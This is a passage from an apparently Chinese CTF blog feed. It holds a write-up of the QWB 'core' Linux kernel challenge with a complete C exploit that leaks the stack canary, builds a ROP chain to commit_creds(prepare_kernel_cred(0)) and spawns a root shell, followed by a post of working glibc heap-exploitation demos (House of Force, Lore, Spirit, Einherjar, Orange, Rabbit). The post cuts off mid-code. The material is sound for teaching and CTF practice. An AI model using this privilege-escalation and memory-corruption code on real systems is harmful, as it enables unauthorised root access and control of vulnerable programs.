core_give.tar.gz./give_to_player/./give_to_player/bzImage./give_to_player/vmlinux./give_to_player/core.cpio./give_to_player/start.sh$ bat start.sh───────┬────────────────────────────────────────────────────────────────────────       │ File: start.sh───────┼────────────────────────────────────────────────────────────────────────   1   │ qemu-system-x86_64 \   2   │ -m 64M \   3   │ -kernel ./bzImage \   4   │ -initrd  ./core.cpio \   5   │ -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;       │  \   6   │ -s  \   7   │ -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \   8   │ -nographic  \</code></pre><p>然后跟前面一样看一下看看文件系统里有啥，<code>init</code> 同样可以得到很多信息，：</p><ul><li>第 9 行把 <code>/proc/kallsyms</code> 的内容保存到了 <code>/tmp/kallsyms</code>，那么就可以从 <code>/tmp/kallsyms</code> 中读取到 <code>commit_creds</code> 和 <code>prepare_kernel_cred</code> 的地址；</li><li>第 10 行把 <code>kptr_restrict</code> 设为 1，禁止通过 <code>/proc/kallsyms</code> 查看函数地址，不过前面已经把其中的信息保存到了一个可读的文件中；</li><li>第 11 行把 <code>dmesg_restrict</code> 设为 1，禁止使用 dmesg；</li><li>第 18 行设置了定时关机，为了避免做题时产生干扰，可以直接把这句删掉然后重新打包。</li></ul><pre><code class="bash">$ file core.cpiocore.cpio: gzip compressed data, last modified: Fri Oct  5 14:08:36 2018, max compression, from Unix$ mv core.cpio core.cpio.gz$ gunzip ./core.cpio.gz$ lscore.cpio$ file ./core.cpio./core.cpio: ASCII cpio archive (SVR4 with no CRC)$ cpio -idmv &lt; ./core.cpio.usrusr/sbin...initetcetc/groupetc/passwdlib64lib64/ld-linux-x86-64.so.2lib64/libc.so.6lib64/libm.so.6...gen_cpio.shbin...vmlinuxrootlinuxrcliblib/modules...tmpcore.cpiocore.ko129851 blocks$ bat init───────┬────────────────────────────────────────────────────────────────────────       │ File: init───────┼────────────────────────────────────────────────────────────────────────   1   │ #!/bin/sh   2   │ mount -t proc proc /proc   3   │ mount -t sysfs sysfs /sys   4   │ mount -t devtmpfs none /dev   5   │ /sbin/mdev -s   6   │ mkdir -p /dev/pts   7   │ mount -vt devpts -o gid=4,mode=620 none /dev/pts   8   │ chmod 666 /dev/ptmx   9   │ cat /proc/kallsyms &gt; /tmp/kallsyms  10   │ echo 1 &gt; /proc/sys/kernel/kptr_restrict  11   │ echo 1 &gt; /proc/sys/kernel/dmesg_restrict  12   │ ifconfig eth0 up  13   │ udhcpc -i eth0  14   │ ifconfig eth0 10.0.2.15 netmask 255.255.255.0  15   │ route add default gw 10.0.2.2  16   │ insmod /core.ko  17   │  18   │ poweroff -d 120 -f &amp;  19   │ setsid /bin/cttyhack setuidgid 1000 /bin/sh  20   │ echo &#39;sh end!\n&#39;  21   │ umount /proc  22   │ umount /sys  23   │  24   │ poweroff -d 0  -f───────┴────────────────────────────────────────────────────────────────────────</code></pre><blockquote><ul><li>可以使用 <code>gen_cpio.sh</code> 重新打包；</li><li>如果不能正常启动，将 QEMU 的内存参数改为 128M。</li></ul></blockquote><p>接下来对模块文件进行分析。可以开导开了 Canary 和 NX：</p><pre><code class="bash">$ file ./core.ko./core.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=54943668385c6573ec1b40a7c06127d9423103b3, not stripped$ checksec ./core.ko    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x0)</code></pre><p>模块入口函数中注册了 <code>/proc/core</code>：</p><pre><code class="cpp">__int64 init_module(){  core_proc = proc_create(&quot;core&quot;, 438LL, 0LL, &amp;core_fops);  printk(&amp;unk_2DE);  return 0LL;}</code></pre><p>在退出函数中删除 <code>/proc/core</code>：</p><pre><code class="cpp">__int64 exit_core(){  __int64 result; // rax  if ( core_proc )    result = remove_proc_entry(&quot;core&quot;);  return result;}</code></pre><p>在 <code>core_ioctl</code> 中有一条 Switch 语句，分别对应 <code>core_read</code>、设置全局变量 <code>off</code> 的值以及 <code>core_copy_func</code>：</p><pre><code class="cpp">__int64 __fastcall core_ioctl(__int64 a1, int c, __int64 data_1){  __int64 data; // rbx  data = data_1;  switch ( c )  {    case 0x6677889B:      core_read(data_1);      break;    case 0x6677889C:      printk(&amp;unk_2CD);      off = data;      break;    case 0x6677889A:      printk(&amp;unk_2B3);      core_copy_func(data);      break;  }  return 0LL;}</code></pre><p><code>core_read</code> 从 <code>v5+off</code> 的位置复制 0x40 个字节到用户空间，也就是可以进行任意读：</p><pre><code class="cpp">unsigned __int64 __fastcall core_read(__int64 a1){  __int64 v1; // rbx  char *v2; // rdi  signed __int64 i; // rcx  unsigned __int64 result; // rax  char v5; // [rsp+0h] [rbp-50h]  unsigned __int64 v6; // [rsp+40h] [rbp-10h]  v1 = a1;  v6 = __readgsqword(0x28u);  printk(&amp;unk_25B);  printk(&amp;unk_275);  v2 = &amp;v5;  for ( i = 0x10LL; i; --i )  {    *(_DWORD *)v2 = 0; // memset(v2, 0, sizeof(v2))    v2 += 4;  }  strcpy(&amp;v5, &quot;Welcome to the QWB CTF challenge.\n&quot;);  result = copy_to_user(v1, &amp;v5 + off, 0x40LL);  if ( !result )    return __readgsqword(0x28u) ^ v6;  __asm { swapgs }  return result;}</code></pre><p><code>core_copy_func</code> 则是从全局变量 <code>name</code> 中复制指定长度的内容到局部变量 <code>buf</code> 上。且传入的长度是有符号整型 <code>signed __int64</code>，而 <code>qmemcpy</code> 的长度使用的是无符号整型 <code>unsigned __int16</code>，可以通过溢出来绕过前面的检查：</p><pre><code class="cpp">signed __int64 __fastcall core_copy_func(signed __int64 len){  signed __int64 result; // rax  __int64 buf; // [rsp+0h] [rbp-50h]  unsigned __int64 v3; // [rsp+40h] [rbp-10h]  v3 = __readgsqword(0x28u);  printk(&amp;unk_215);  if ( len &gt; 0x3F )  {    printk(&amp;unk_2A1);    result = 0xFFFFFFFFLL;  }  else  {    result = 0LL;    qmemcpy(&amp;buf, &amp;name, (unsigned __int16)len);  }  return result;}</code></pre><p><code>core_write</code> 往全局变量 <code>name</code> 上写指定内容：</p><pre><code class="cpp">signed __int64 __fastcall core_write(__int64 a1, __int64 buf, unsigned __int64 a3){  unsigned __int64 len; // rbx  len = a3;  printk(&amp;unk_215);  if ( len &lt;= 0x800 &amp;&amp; !copy_from_user(&amp;name, buf, len) )    return (unsigned int)len;  printk(&amp;unk_230);  return 0xFFFFFFF2LL;}</code></pre><p>最后 <code>core_release</code> 只是有一个 printk 输出：</p><pre><code class="cpp">__int64 core_release(){  printk(&amp;unk_204);  return 0LL;}</code></pre><p>综上整理一下不难发现，我们可以任意地址读、可以往一个全局变量和一个函数中的局部变量写，那么就有下面的 ROP 思路：</p><ol><li>使用 <code>ioctl</code> 设置全局变量 <code>off</code>，然后调用 <code>core_read</code> 来泄漏 Canary；</li><li>使用 <code>core_write</code> 向 <code>name</code> 写入 ROP 链（构造 <code>commit_creds(prepare_kernel_cred(0))</code>，地址通过 <code>/tmp/kallsyms</code> 中的内容获取）；</li><li>使用 <code>core_copy_func</code> 把 <code>name</code> 上构造的 ROP 链写到局部变量上；</li><li>最后返回用户态调用 <code>system(&quot;/bin/sh&quot;)</code>（通过 <code>swapgs ; iretq</code> 两条指令来恢复寄存器和返回用户态）。</li></ol><blockquote><p>关于找 Gadget 的方法，M4x 师傅说是用 ropper，但我个人感觉 ROPgadget 更快。</p><pre><code class="bash">$ ROPgadget --binary ./vmlinux &gt; gadgets</code></pre><p><code>ireq</code> 可以用 objdump 来找。</p></blockquote><p>TODO</p><p>Exploit：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;void spawn_shell() {  if (!getuid()) {        system(&quot;/bin/sh&quot;);        exit(0);    } else {        puts(&quot;[!] UID != 0&quot;);        exit(-1);    }}size_t commit_creds, prepare_kernel_cred;size_t raw_vmlinux_base = 0xffffffff81000000;size_t vmlinux_base = 0;size_t find_symbols() {    FILE *kallsyms_fd = fopen(&quot;/tmp/kallsyms&quot;, &quot;r&quot;);    if (kallsyms_fd &lt; 0) {        puts(&quot;[!] Open /tmp/kallsyms error...&quot;);        exit(-1);    }    char buf[0x30];    while(fgets(buf, 0x30, kallsyms_fd)) {        if (commit_creds &amp; prepare_kernel_cred)            return 0;        if (strstr(buf, &quot;commit_creds&quot;) &amp;&amp; !commit_creds) {            char hex[20];            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;commit_creds);            printf(&quot;commit_creds =&gt; %p.\n&quot;, commit_creds);            vmlinux_base = commit_creds - 0x9c8e0;            printf(&quot;vmlinux_base =&gt; %p.\n&quot;, vmlinux_base);        }        if (strstr(buf, &quot;prepare_kernel_cred&quot;) &amp;&amp; !prepare_kernel_cred) {            char hex[20];            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;prepare_kernel_cred);            printf(&quot;prepare_kernel_cred =&gt; %p.\n&quot;, prepare_kernel_cred);            vmlinux_base = prepare_kernel_cred - 0x9cce0;            printf(&quot;vmlinux_base =&gt; %p.\n&quot;, vmlinux_base);        }    }    if (!(prepare_kernel_cred &amp; commit_creds)) {        puts(&quot;[*] Error...&quot;);        exit(-1);    }}size_t user_cs, user_ss, user_rflags, user_sp;void save_status() {    __asm__(        &quot;mov user_cs, cs;\n&quot;        &quot;mov user_ss, ss;\n&quot;        &quot;mov user_sp, sp;\n&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;\n&quot;    );    puts(&quot;[*] User status has been saved.&quot;);}void set_off(int fd, long long idx) {    printf(&quot;[*] Set off = %ld.\n&quot;, idx);    ioctl(fd, 0x6677889C, idx);}void core_read(int fd, char *buf) {    puts(&quot;[*] Read to buf!&quot;);    ioctl(fd, 0x6677889B, buf);}void core_copy_func(int fd, long long size) {    printf(&quot;[*] Copy %ld byte(s) from user.\n&quot;, size);    ioctl(fd, 0x6677889A, size);}uint64_t pop_rdi_ret = 0xffffffff81000b2f;uint64_t pop_rdx_ret = 0xffffffff810a0f49;uint64_t pop_rcx_ret = 0xffffffff81021e53;uint64_t mov_rdi_rax_call_rdx = 0xffffffff8101aa6a;uint64_t swapgs_popfq_ret = 0xffffffff81a012da;uint64_t iretq_ret = 0xffffffff81050ac2;int main() {    save_status();    int fd = open(&quot;/proc/core&quot;, 2);    if(fd &lt; 0) {        puts(&quot;[*] Open /proc/core error...&quot;);        exit(-1);    }    find_symbols();    // gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;    ssize_t offset = vmlinux_base - raw_vmlinux_base;    set_off(fd, 0x40);    char buf[0x40];    core_read(fd, buf);    size_t canary = ((size_t *)buf)[0];    printf(&quot;[+] Canary = %p\n&quot;, canary);    size_t rop[0x1000] = {0};    int i;    for (i = 0; i &lt; 10; i++)        rop[i] = canary;    // prepare_kernel_cred(0)    rop[i++] = pop_rdi_ret + offset;    rop[i++] = 0;    rop[i++] = prepare_kernel_cred;    // ...    rop[i++] = pop_rdx_ret + offset; // pop rdx ; ret    rop[i++] = pop_rcx_ret + offset; // pop rcx ; ret    rop[i++] = mov_rdi_rax_call_rdx + offset; // mov rdi, rax ; call rdx    rop[i++] = commit_creds;    // Restore registers    rop[i++] = swapgs_popfq_ret + offset;    rop[i++] = 0;    rop[i++] = iretq_ret + offset;    rop[i++] = (size_t)spawn_shell; // rip    rop[i++] = user_cs;    rop[i++] = user_rflags;    rop[i++] = user_sp;    rop[i++] = user_ss;    write(fd, rop, 0x800); // Write rop chain    core_copy_func(fd, 0xffffffffffff0000 | (0x100));    return 0;}</code></pre><h1 id="Debug-with-gdb"><a href="#Debug-with-gdb" class="headerlink" title="Debug with gdb"></a>Debug with gdb</h1><p>进行调试的话一般要先在 QEMU 启动脚本中添加 <code>-gdb tcp::1234</code> 参数（<code>-s</code> 参数同理）。然后用 <code>gdb ./vmlinux</code> 启动 GDB（如果没有 <code>vmlinux</code> 需要提前提取）。接下来在 gdb 中添加调试符号：</p><pre><code class="gdb">add-symbol-file /path/to/lkms/example.ko [offset]</code></pre><blockquote><p><code>offset</code> 的值通过在 QEMU 中运行 lsmod 来得到：</p><pre><code class="bash">/ $ lsmodcore 16384 0 - Live 0xffffffffc0211000 (O)</code></pre><p>或者可以修改启动脚本以 root 权限来查看 <code>/sys/module/core/sections/.text</code> 段的值：</p><pre><code class="bash">/ # cat /sys/module/core/sections/.text0xffffffffc0211000</code></pre></blockquote><p>然后就可以 <code>target remote localhost:1234</code> 开始调试了：</p><pre><code class="bash">$ gdb ./vmlinux -qGEF for linux ready, type `gef&#39; to start, `gef config&#39; to configure80 commands loaded for GDB 7.11.1 using Python engine 3.5Reading symbols from ./vmlinux...(no debugging symbols found)...done.gef➤  add-symbol-file fs/core.ko 0xffffffffc027a000add symbol table from file &quot;fs/core.ko&quot; at    .text_addr = 0xffffffffc027a000Reading symbols from fs/core.ko...(no debugging symbols found)...done.gef➤  b core_readBreakpoint 1 at 0xffffffffc027a063gef➤  target remote localhost:1234Remote debugging using localhost:12340xffffffffa6a6e7d2 in ?? ()[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax   : 0xffffffffa6a6e7d0  →  0x2e66001f0fc3f4fb  →  0x2e66001f0fc3f4fb$rbx   : 0xffffffffa7410480  →  0x0000000080000000  →  0x0000000080000000$rcx   : 0x0000000000000000  →  0x0000000000000000$rdx   : 0x0000000000000000  →  0x0000000000000000$rsp   : 0xffffffffa7403eb8  →   movabs al, ds:0xc2ffffffffa62b65$rbp   : 0x0000000000000000  →  0x0000000000000000$rsi   : 0x0000000000000000  →  0x0000000000000000$rdi   : 0x0000000000000000  →  0x0000000000000000$rip   : 0xffffffffa6a6e7d2  →  0x1f0f2e66001f0fc3  →  0x1f0f2e66001f0fc3$r8    : 0xffff8d484641bf20  →   (bad)$r9    : 0x0000000000000000  →  0x0000000000000000$r10   : 0x0000000000000000  →  0x0000000000000000$r11   : 0x000000000000018c  →  0x000000000000018c$r12   : 0xffffffffa7410480  →  0x0000000080000000  →  0x0000000080000000$r13   : 0xffffffffa7410480  →  0x0000000080000000  →  0x0000000080000000$r14   : 0x0000000000000000  →  0x0000000000000000$r15   : 0x0000000000000000  →  0x0000000000000000$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0010 $ss: 0x0018 $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000───────────────────────────────────────────────────────────────────── stack ────[!] Unmapped address─────────────────────────────────────────────────────────────── code:x86:64 ────   0xffffffffa6a6e7cf                  nop   0xffffffffa6a6e7d0                  sti   0xffffffffa6a6e7d1                  hlt   0xffffffffa6a6e7d2                  ret   0xffffffffa6a6e7d3                  nop    DWORD PTR [rax]   0xffffffffa6a6e7d6                  nop    WORD PTR cs:[rax+rax*1+0x0]   0xffffffffa6a6e7e0                  mov    rax, QWORD PTR gs:0x14d40   0xffffffffa6a6e7e9                  or     BYTE PTR ds:[rax+0x2], 0x20   0xffffffffa6a6e7ee                  mov    rdx, QWORD PTR [rax]─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, stopped 0xffffffffa6a6e7d2 in ?? (), reason: SIGTRAP───────────────────────────────────────────────────────────────────── trace ────[#0] 0xffffffffa6a6e7d2 → ret[#1] 0xffffffffa62b65a0 → jmp 0xffffffffa62b6541[#2] 0xc2 → irq_stack_union()[#3] 0xffffffffa78c4900 → int3[#4] 0xffff8d48466d4900 → jb 0xffff8d48466d4971[#5] 0xffffffffa78cc2c0 → int3────────────────────────────────────────────────────────────────────────────────gef➤</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/</a><br><a href="http://m4x.fun/post/linux-kernel-pwn-abc-1/" target="_blank" rel="noopener">http://m4x.fun/post/linux-kernel-pwn-abc-1/</a><br><a href="https://richardustc.github.io/2013-05-21-2013-05-21-min-mmap-addr.html" target="_blank" rel="noopener">https://richardustc.github.io/2013-05-21-2013-05-21-min-mmap-addr.html</a><br><a href="https://blog.csdn.net/jhyboss/article/details/76505873" target="_blank" rel="noopener">https://blog.csdn.net/jhyboss/article/details/76505873</a><br><a href="https://www.cnblogs.com/skywang12345/archive/2013/05/15/driver_class.html" target="_blank" rel="noopener">https://www.cnblogs.com/skywang12345/archive/2013/05/15/driver_class.html</a><br><a href="https://www.anquanke.com/post/id/86490" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86490</a><br><a href="https://blog.csdn.net/m0_38100569/article/details/100673103" target="_blank" rel="noopener">https://blog.csdn.net/m0_38100569/article/details/100673103</a><br><a href="http://eternalsakura13.com/2018/03/31/b_core/" target="_blank" rel="noopener">http://eternalsakura13.com/2018/03/31/b_core/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;初涉 Kernel Exploit。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
      <category term="linux" scheme="blog.b3ale.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>House of All in One</title>
    <link href="blog.b3ale.cn/2020/04/25/%5BTODO%5DHouse-of-All-in-One/"/>
    <id>blog.b3ale.cn/2020/04/25/%5BTODO%5DHouse-of-All-in-One/</id>
    <published>2020-04-25T15:39:50.000Z</published>
    <updated>2020-05-03T13:50:44.006Z</updated>
    
    <content type="html"><![CDATA[<p><code>House-of-*</code> 是对堆漏洞利用的一系列技术，起源于一篇叫做 Malleus Maleficarum（也有一本中世纪的时候有关女巫的条约的书叫做<a href="https://en.wikipedia.org/wiki/Malleus_Maleficarum" target="_blank" rel="noopener">女巫之槌</a>）的文章。</p><a id="more"></a><h1 id="Malleus-Maleficarum"><a href="#Malleus-Maleficarum" class="headerlink" title="Malleus Maleficarum"></a><a href="https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt" target="_blank" rel="noopener">Malleus Maleficarum</a></h1><h2 id="House-of-Prime-glibc-2-3-5"><a href="#House-of-Prime-glibc-2-3-5" class="headerlink" title="House of Prime (glibc-2.3.5)"></a>House of Prime (glibc-2.3.5)</h2><p>TODO</p><p>(<a href="https://gbmaster.wordpress.com/2014/08/24/x86-exploitation-101-this-is-the-first-witchy-house/" target="_blank" rel="noopener">X86 EXPLOITATION 101: THIS IS THE FIRST WITCHY HOUSE</a>)</p><pre><code class="cpp">void_int_free(mstate av, Void_t* mem){    mchunkptr       p;           /* chunk corresponding to mem */    INTERNAL_SIZE_T size;        /* its size */    mfastbinptr*    fb;          /* associated fastbin */    ...    p = mem2chunk(mem);    size = chunksize(p);    if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)        || __builtin_expect ((uintptr_t) p &amp; MALLOC_ALIGN_MASK, 0))    {        errstr = &quot;free(): invalid pointer&quot;;      errout:        malloc_printerr (check_action, errstr, mem);        return;    }</code></pre><h2 id="House-of-Mind-glibc-2-3-5"><a href="#House-of-Mind-glibc-2-3-5" class="headerlink" title="House of Mind (glibc-2.3.5)"></a>House of Mind (glibc-2.3.5)</h2><p>TODO</p><p>(<a href="https://gbmaster.wordpress.com/2015/06/15/x86-exploitation-101-house-of-mind-undead-and-loving-it/" target="_blank" rel="noopener">X86 EXPLOITATION 101: “HOUSE OF MIND” – UNDEAD AND LOVING IT…</a>)</p><pre><code class="cpp">public_fREe(Void_t* mem){  mstate ar_ptr;  mchunkptr p;                          /* chunk corresponding to mem */  void (*hook) (__malloc_ptr_t, __const __malloc_ptr_t) = __free_hook;  if (hook != NULL) {    (*hook)(mem, RETURN_ADDRESS (0));    return;  }  if (mem == 0)                              /* free(0) has no effect */    return;  p = mem2chunk(mem);#if HAVE_MMAP  if (chunk_is_mmapped(p))                       /* release mmapped memory. */  {    munmap_chunk(p);    return;  }#endif  ar_ptr = arena_for_chunk(p);#if THREAD_STATS  if(!mutex_trylock(&amp;ar_ptr-&gt;mutex))    ++(ar_ptr-&gt;stat_lock_direct);  else {    (void)mutex_lock(&amp;ar_ptr-&gt;mutex);    ++(ar_ptr-&gt;stat_lock_wait);  }#else  (void)mutex_lock(&amp;ar_ptr-&gt;mutex);#endif  _int_free(ar_ptr, mem);  (void)mutex_unlock(&amp;ar_ptr-&gt;mutex);}</code></pre><h2 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h2><p>Modify top chunk to control buffer.</p><p>(<a href="https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/" target="_blank" rel="noopener">X86 EXPLOITATION 101: “HOUSE OF FORCE” – JEDI OVERFLOW</a>)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#define offset1 0x601080 - 0x10 - 0x602020 - 0x10#define offset2 0x7fffffffdf10 - 0x10 - 0x6014f0 - 0x10char buf1[50] = &quot;Original Buffer (bss).&quot;;int main() {    void *p, *q;    char buf2[50] = &quot;Original Buffer (stack).&quot;;    p = malloc(0x18);    *(uint64_t *)((uint64_t)p + 0x18) = -1; // Set top chunk&#39;s size = 0xffffffffffffffff    malloc(offset1);    q = malloc(0x48);    puts(buf1);    memset(q, &#39;X&#39;, strlen(buf1));    puts(buf1);    /*    p = malloc(0x18);    *(uint64_t *)((uint64_t)p + 0x18) = -1; // Set top chunk&#39;s size = 0xffffffffffffffff    malloc(offset2);    q = malloc(0x48);    puts(buf2);    memset(q, &#39;Y&#39;, strlen(buf2));    puts(buf2);    */    exit(0);}</code></pre><h2 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h2><p>Use the mechanism of smallbin to control buffer. (maybe Smallbin Attack)</p><p>(<a href="https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/" target="_blank" rel="noopener">X86 EXPLOITATION 101: “HOUSE OF LORE” – PEOPLE AND TRADITIONS</a>)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;void sh() {    system(&quot;/bin/sh&quot;);    exit(0);}int main() {    void *p, *q, *r, *s, *t;    char buf1[0x20], buf2[0x20];    fprintf(stderr, &quot;buf1 =&gt; %p\n&quot;, buf1);    fprintf(stderr, &quot;buf2 =&gt; %p\n&quot;, buf2);    p = malloc(0x68);    fprintf(stderr, &quot;p = malloc(0x68) =&gt; %p\n&quot;, p);    *(uint64_t *)((uint64_t)buf1 + 0x10) = (uint64_t)p - 0x10; // Set buf1&#39;s fd = p - 0x10    *(uint64_t *)((uint64_t)buf1 + 0x18) = (uint64_t)buf2; // Set buf1&#39;s bk = buf2    *(uint64_t *)((uint64_t)buf2 + 0x10) = (uint64_t)buf1; // Set buf2&#39;s fd = buf1    q = malloc(0x408);    fprintf(stderr, &quot;q = malloc(0x408) =&gt; %p\n&quot;, q);    free(p);    r = malloc(0x508);    fprintf(stderr, &quot;r = malloc(0x508) =&gt; %p\n&quot;, r); // Trigger malloc_consolidate    *(uint64_t *)((uint64_t)p + 0x8) = (uint64_t)buf1; // Set p&#39;s bk = buf1    s = malloc(0x68);    fprintf(stderr, &quot;s = malloc(0x68) =&gt; %p\n&quot;, s); // Get p (The original Freed Chunk)    t = malloc(0x68);    fprintf(stderr, &quot;t = malloc(0x68) =&gt; %p\n&quot;, t); // Allacte to Stack    uint64_t sh_addr = (uint64_t)sh;    memcpy(t + 0x48, &amp;sh_addr, 8);}</code></pre><h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><p>Free a fake chunk into fastbin. (Stack overflow)</p><p>(<a href="https://gbmaster.wordpress.com/2015/07/21/x86-exploitation-101-house-of-spirit-friendly-stack-overflow/" target="_blank" rel="noopener">X86 EXPLOITATION 101: “HOUSE OF SPIRIT” – FRIENDLY STACK OVERFLOW</a>)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;char target[0x100];int main() {    void *p, *mem;    fprintf(stderr, &quot;Target =&gt; %p\n&quot;, target);    p = malloc(0x58);    mem = (uint64_t *)((uint64_t)target + 0x10); // Get fake chunk&#39;s mem    fprintf(stderr, &quot;fake chunk&#39;s mem =&gt; %p\n&quot;, mem);    *(uint64_t *)((uint64_t)target + 0x8) = 0x61; // Set fake chunk&#39;s size = 0x61    *(uint64_t *)((uint64_t)target + 0x68) = 0x41; // Set fake chunk&#39;s next chunk&#39;s size = 0x41    free(p);    free(mem);    fprintf(stderr, &quot;malloc(0x58) =&gt; %p\n&quot;, malloc(0x58));    exit(0);}</code></pre><h2 id="House-of-Chaos"><a href="#House-of-Chaos" class="headerlink" title="House of Chaos"></a>House of Chaos</h2><pre><code>(&amp;*^^&amp;%$#%$#**_)+_(_)**(%%^##$@%^^*(%$&amp;*%^$&amp;%%^^&amp;#!@^&amp;_)^&amp;...</code></pre><h1 id="Later-House"><a href="#Later-House" class="headerlink" title="Later House"></a>Later House</h1><h2 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a><a href="https://www.youtube.com/watch?v=tq3mPjsl-H0" target="_blank" rel="noopener">House of Einherjar</a></h2><p>Mostly chunk overlapping. (Unlink, Off by One)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;unistd.h&gt;int main() {    char *p, *q, *r, *s;    p = malloc(0x208);    q = malloc(0x18);    r = malloc(0xf8);    s = malloc(0x18);    printf(&quot;Fake chunk =&gt; %p\n&quot;, p);    *(uint64_t *)((uint64_t)p) = 0;    *(uint64_t *)((uint64_t)p + 0x8) = 0x221; // Fake chunk&#39;s size    // Bypass unlink    *(uint64_t *)((uint64_t)p + 0x10) = p; // Fake chunk&#39;s fd    *(uint64_t *)((uint64_t)p + 0x18) = p; // Fake chunk&#39;s bk    printf(&quot;Off by One\n&quot;);    *(uint64_t *)((uint64_t)q + 0x10) = 0x220; // prev_size    *(uint8_t *)((uint64_t)q + 0x18) = &#39;\x00&#39;; // Off by One    free(r); // unlink    printf(&quot;malloc(0x310) =&gt; %p\n&quot;, malloc(0x318));    return 0;}</code></pre><h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a><a href="http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html" target="_blank" rel="noopener">House of Orange</a></h2><p>Create a freed chunk without <code>free()</code> and attack with <code>_IO_FILE</code> structure. (Unsortedbin Attack)</p><pre><code class="cpp">// glibc-2.23 version#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#define _IO_list_all 0x3c5520#define one_gadget 0xf1147char fake_vtable[0xa8];int main() {    void *p;    void *fake_file;    p = malloc(0x18);    *(uint64_t *)((uint64_t)p + 0x18) = 0xfe1; // Set top chunk&#39;s size = 0xfe1    malloc(0x1000); // Trigger sysmalloc (free top chunk)    p = malloc(0x500); // Get a unsortedbin-chunk    uint64_t libc_base = (uint64_t)(*(uint64_t *)p) - 0x3c5188;    fprintf(stderr, &quot;leak libc =&gt; %p\n&quot;, libc_base);    uint64_t unsorted_bin_chunk_addr = (uint64_t)p + 0x500;    fake_file = unsorted_bin_chunk_addr;    uint64_t IO_list_all_addr = libc_base + _IO_list_all;    // Create fake file (also a fake smallbin)    *(uint64_t *)((uint64_t)fake_file + 0x8) = 0x61; // _IO_read_ptr ; Set smallbin&#39;s size ; Fake _chain @ `&amp;unsortedbin + 0x68`    *(uint64_t *)((uint64_t)fake_file + 0x18) = IO_list_all_addr - 0x10; // _IO_read_base ; For Unsoredbin Attack    // Bypass _IO_overflow_t    *(uint64_t *)((uint64_t)fake_file + 0xc0) = 0; // _mode    *(uint64_t *)((uint64_t)fake_file + 0x28) = 1; // _IO_write_ptr    *(uint64_t *)((uint64_t)fake_file + 0x20) = 0; // _IO_write_base    *(uint64_t *)((uint64_t)fake_file + 0xd8) = fake_vtable; // vtable    uint64_t one_gadget_addr = libc_base + one_gadget;    *(uint64_t *)((uint64_t)fake_vtable + 0x18) = one_gadget_addr; // __overflow    malloc(1); // Trigger malloc_printerr    exit(0);}</code></pre><h2 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a><a href="https://github.com/shift-crops/House_of_Rabbit" target="_blank" rel="noopener">House of Rabbit</a></h2><p>TODO</p><p>(recommend <a href="http://p4nda.top/2018/04/18/house-of-rabbit/" target="_blank" rel="noopener">P4nda’s article</a>)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char target[0x50] = &quot;Orignial Buffer.&quot;;char buf[0x40];int main() {    void *p, *q;    fprintf(stderr, &quot;Target: %s\n&quot;, target);    p = malloc(0xa00008);    free(p);    p = malloc(0xa00008);    free(p);    p = malloc(0x28);    q = malloc(0x88);    free(p);    *(uint64_t *)((uint64_t)buf + 0x8) = 0x11; // Set Fake Chunk1&#39;s size = 0x11    *(uint64_t *)((uint64_t)buf + 0x18) = -0xf; // Set Fake Chunk2&#39;s prev_size = 0xfffffffffffffff1    